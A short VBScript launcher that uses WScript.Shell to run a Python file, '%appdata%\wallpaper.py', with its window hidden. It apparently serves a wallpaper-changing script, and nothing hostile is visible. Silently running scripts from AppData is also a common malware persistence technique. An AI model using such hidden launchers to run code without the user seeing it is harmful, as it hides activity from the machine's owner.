Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "%appdata%\wallpaper.py" & Chr(34), 0
Set WinScriptHost = Nothing
